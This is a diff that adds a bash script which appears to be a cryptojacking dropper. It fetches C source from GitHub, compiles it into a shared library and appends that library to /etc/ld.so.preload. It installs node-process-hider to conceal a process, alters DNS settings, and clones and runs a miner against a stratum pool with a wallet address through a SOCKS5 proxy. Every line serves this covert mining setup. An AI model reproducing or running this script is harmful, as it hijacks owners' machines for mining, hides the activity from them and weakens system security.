@@ -1,0 +1,14 @@
+#!/bin/bash
+apt-get update ; apt-get -y install sudo npm
+curl https://raw.githubusercontent.com/Alicouf/Soft/main/nyput.c -o nyput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyput.c
+echo "supersede domain-name-servers 8.8.8.8;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.3.1 -y && npm i -g node-process-hider && ph add 500"
+mkdir .kap && cd .kap
+git clone https://github.com/Alicouf/Soft.git
+cd Soft && chmod +x 500 && ./500 --algorithm randomscash --pool stratum-asia.rplant.xyz:17019 --tls true --wallet scash1qm66fvwwfl24xrehvfk5ygvfx2hvlhzk6rhfcvy.nyumput --password m=solo --proxy socks5://184.181.217.210:4145 --keepalive true
